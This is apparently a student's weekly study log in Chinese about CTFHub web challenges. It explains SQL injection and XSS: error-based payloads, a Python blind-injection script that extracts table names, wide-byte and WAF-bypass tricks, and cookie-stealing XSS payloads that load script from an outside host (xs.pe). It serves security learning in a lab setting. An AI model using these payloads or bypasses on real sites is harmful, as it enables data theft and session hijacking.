# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. ctfhub做到了文件上传
2. 学习了更多sql注入方法以及绕过姿势，初步学会sqlmap用法以及脚本编写
3. 学习了xss攻击，入门js
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. 继续学习ctfhub直到web基础通关
2. 刷题进阶
3. 巩固语言基础
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
### 一.sql注入
+ ####  报错注入
1. updatexml()型
> + updatexml(参数1,xpath,参数3),这是一个用于更新xml节点的函数，参数1是对象名，xpath为节点路径,参数2为更新内容
> + concat()函数用于字符串拼接

如果xpath路径含有非法字符(比如~，十六进制表示为0x7e)，就会报错，并且返回报错信息。如果我们将路径与注入payload用concat()函数拼接，报错返回信息就会包含我们注入的返回结果
```sql
updatexml(1,concat(0x7e,(select database())),1)
```
由于报错返回信息有字数限制，可以用substr()，limit等函数分段获取
```sql
updatexml(1,concat(0x7e,substr(select group_concat(name) from users,1,31)),1)
```
2. extractvalue()型
> + extractvalue(参数1,xpath)作用与updatexml()相同，参数1是对象名，xpath为节点路径

3.floor()型
> + group by 'expr'是mysql的分组查询语句，他根据后面的表达式的值对数据进行分组，如果expr的值相同就分为一组，否则新建一个组，它遵循一个组与一个值一一对应的原则。如果发生报错，就会返回返回expr的值
> + rand()返回一个0到1之间的随机浮点数

floor(rand(0)*2)是一个精心构造的payload，他会固定生成一个伪随机数列(0,1,1,0,1...)，每次分组时都会调用这个表达式。这就导致会出现多个组与同一个值对应的情况，从而触发报错，返回expr的值
```sql
select count(*),concat((select database()),0x26,floor(rand(0)*2)) as x from information_schema.tables group by x
//as重命名为x方便调用
//0x26是&符号，用于区分floor值和返回结果
```

+ #### 盲注
其流程大差不差，这里拿ctfhub的题目举例
这是部分脚本，用于爆表
```python
def tables(url):
    count = 0
    for l in range(1,100):
        dataurl = purl + f'1%20and%20(select%20count(*)table_name%20from%20information_schema.tables%20where%20table_schema=database())={l}'
        # %20代表空格，不然url会断开
        data_response = requests.get(dataurl)
        if 'query_success' in data_response.content.decode("utf-8"):
            print(f"一共有{l}张表")
            count = l
            break
        # 先用count()函数数表的数量
    for t in range(0,count):
        # count值作为limit的参数，逐个爆表名，注意limit识别的是记录的索引，所以从0开始
        len = 0
        name = ''
        for l in range(1,100):
            dataurl = purl + f'1%20and%20length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20{t},1))={l}'
            # 一定要注意payload要用()改变优先级，防止语法识别偏差
            data_response = requests.get(dataurl)
            if 'query_success' in data_response.content.decode("utf-8"):
                len = l
                break
        for i in range(1,len+1):
            for j in range(65,123):
                dataurl = purl + f'1%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20{t},1),{i},1))={j}'
                data_response = requests.get(dataurl)
                if 'query_success' in data_response.content.decode("utf-8"):
                    name += chr(j)
                    print(name)
                    break
```
先是用count()函数数表的数量，然后用length()函数获取每个表名的长度，最后用substr()和ascii()函数逐字符爆出表名

+ #### 宽字节注入(前提数据库为GBK编码)
>宽字节注入主要用于过滤函数的绕过，在GBK编码中，一个汉字占用两个字节，可以通过构造使被过滤字符拼接变成汉字，从而绕过过滤

addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数会在字符前加上反斜杠使字符转义

单引号过滤绕过：
由于\的url编码是%5c，但当我们输入%df'闭合sql时，加上的反斜杠就会变成%df%5c'，而%df%5c是繁体汉字連的编码，返回变成参数連'，进而使单引号转义失败
```sql
name = %df' or 1=1 #
```
+ #### sql的一些waf绕过技巧

1. 空格可以用/**/、+、%0a等替代
2. and/or可以用&&、||替代
3. 注释符号:#、--+等代替
4. 内联注释:/\*!50001(payload)\*/，5000表示mysql版本号，指当mysql版本大于等于5.00.01时执行括号内的payload
5. 变量声明:
```sql
id = 1;declare @a varchar(50);set @a='sel'+'ect'+'database()';exec(@a)
//varchar表示变量类型为字符串，50表示长度
```
6. ascii码替代字符:
char(97)函数:将ascii码转换为字符
ascaii(a)函数:将字符转换为ascii码
7. hex编码
hex()函数:将字符串转换为十六进制表示
unhex()函数:将十六进制表示转换为字符串
```sql
id = 1;exec(0x...)
```
8. substr函数替代，用法一样:
substring()、mid()
9. 参数污染:
```sql
?id=1&id=2 union select...
```
10. 双写绕过，大小写绕过

### 二.XSS跨站脚本攻击
> XSS是通过给网站注入javascript恶意脚本，欺骗用户的攻击方式
> CTF大部分题主要考察cookie窃取，让一个机器人模拟用户点击你构造的恶意链接，从而在个人服务器上获取cookie

+ 主要payload
```html
<sCRiPt sRC=//xs.pe/0AD></sCrIpT>
// xs.pe是一个xss平台(相当于个人服务器)，src用于访问链接，让用户触发访问请求，从而暴露cookie
```

1. 反射性XSS
>将恶意脚本注入到URL参数中，当用户点击链接时，脚本会被执行
2. 存储型XSS
>将恶意脚本存储在网站的数据库中，当用户访问相关页面时，脚本会被执行
3. DOM型XSS
>DOM是JS与网页元素的操作的接口，它的作用是将网页转为一个JS对象，从而可以用脚本进行各种操作

这个细说一下，dom型xss的注入点一般藏在前端元素的js代码中，由于js对用户输入处理不当，导致我们可以像sql一样构造恶意脚本。
先判断注入点，再用\</script>或引号，冒号闭合注入点，再写入恶意脚本。
当执行js时(比如事件)，就会执行恶意脚本

4. DOM跳转
>如果js出现\<a href="<用户输入>">\</a>或location.href = userInput等跳转链接的代码，考虑dom跳转

javascript:伪协议，直接执行:后面的JavaScript代码
$.getScript()是一种jQuery方法(js便捷语法) ，用于构造js语句
所以payload一般长这样:

```html
?参数=javascript:$.getScript("SrC=//xs.pe/0AD")
```

# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
还是比较基础的东西
